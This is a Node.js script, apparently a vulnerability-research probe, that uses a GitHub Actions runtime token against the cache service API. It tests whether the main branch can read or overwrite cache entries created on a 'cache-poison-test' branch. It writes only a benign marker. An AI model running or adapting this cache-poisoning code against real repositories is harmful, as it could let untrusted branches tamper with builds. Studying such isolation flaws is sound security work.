const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REF = process.env.GITHUB_REF || '';

// Cache created by v13 ON cache-poison-test branch
const V13_KEY = 'branch-poison-test-main-target';
const V13_VERSION = '1a8c74c0d626e84015ce3e072f00e220686e20bc39156079c9d069a1cb39aa7d';

// Cache created by v10 ON main branch (readable cross-run, confirmed v11)
const V10_KEY = 'probe-v10-finalize-fixed';
const V10_VERSION = 'a14cbe44f4754c7935c91d1cd56f39f65180627f332662692f387a07dd449a41';

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  console.log('=== V14: MAIN BRANCH reads FEATURE BRANCH cache ===');
  console.log('GITHUB_REF:', GITHUB_REF);
  console.log('This run UUID:', ORCHESTRATION_ID.split('.')[0]);

  // Control: v10 key (created on main) should still be readable
  console.log('\n=== CONTROL: v10 main-branch cache (should be ok:true) ===');
  const ctrl = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: V10_KEY, version: V10_VERSION,
  });
  const ctrlP = JSON.parse(ctrl.body || '{}');
  console.log('[CTRL] v10 key on main:', ctrl.status, ctrlP.ok ? 'ok:TRUE (expected - same branch)' : 'ok:false (v10 expired?)');

  // Test: v13 key (created on cache-poison-test) - can main read it?
  console.log('\n=== BRANCH ISOLATION TEST: main reads cache-poison-test cache ===');
  const r1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: V13_KEY, version: V13_VERSION,
  });
  const r1P = JSON.parse(r1.body || '{}');
  console.log('[BRANCH-ISO T1] main reads cache-poison-test cache:', r1.status, '|', r1.body);
  if (r1P.ok && r1P.signed_download_url) {
    console.log('\n!!! CRITICAL: BRANCH ISOLATION BYPASS !!!');
    console.log('main branch read cache created on cache-poison-test!');
    console.log('This allows feature branch to poison main branch caches!');
  } else {
    console.log('ok:false — branch isolation works (main cannot read feature-branch cache)');
  }

  // Also: can we WRITE a cache entry on main with the SAME key as v13?
  // If we can write without "already exists" error, it means v13's entry didn't conflict
  // (confirming they're in separate branch-scoped namespaces)
  console.log('\n=== WRITE COLLISION TEST: create same key on main ===');
  const blobPut = (url, content) => new Promise((resolve) => {
    const u = new URL(url); const buf = Buffer.from(content, 'utf8');
    const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'Content-Length': buf.length, 'x-ms-blob-type': 'BlockBlob' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode })); });
    r.on('error', e => resolve({ status: 'ERR' })); r.write(buf); r.end();
  });

  const mainContent = JSON.stringify({ created_on_branch: GITHUB_REF, key: V13_KEY, purpose: 'main branch write same key' });
  const r2 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: V13_KEY, version: V13_VERSION,
  });
  console.log('[COLLISION] CreateCacheEntry same key on main:', r2.status, '|', r2.body.substring(0, 150));
  if (r2.status === 200 && r2.body.includes('signed_upload_url')) {
    const e2 = JSON.parse(r2.body);
    const r2b = await blobPut(e2.signed_upload_url, mainContent);
    console.log('[COLLISION] Blob upload:', r2b.status);
    const r2c = await post(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
      key: V13_KEY, version: V13_VERSION, sizeBytes: Buffer.byteLength(mainContent),
    });
    console.log('[COLLISION] Finalize:', r2c.status, '|', r2c.body);
    // Wait 3s for propagation then read back
    await new Promise(r => setTimeout(r, 3000));
    const r2d = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
      key: V13_KEY, version: V13_VERSION,
    });
    const r2dP = JSON.parse(r2d.body || '{}');
    console.log('[COLLISION] Read main\'s version:', r2d.status, r2dP.ok ? 'ok:true' : 'ok:false');
    if (r2dP.ok && r2dP.signed_download_url) {
      // Read the content to see WHICH version (main vs feature branch)
      const u = new URL(r2dP.signed_download_url);
      const content = await new Promise((resolve) => {
        const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'GET' },
          (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve(d.substring(0,300))); });
        req.on('error', e => resolve('ERR: ' + e.message)); req.end();
      });
      console.log('[COLLISION] Content:', content);
      console.log(content.includes('main branch') ? 'CONTENT = main version (expected)' : 'CONTENT = feature branch version (collision?)');
    }
  }
}
main().catch(e => console.log('Fatal:', e.message));
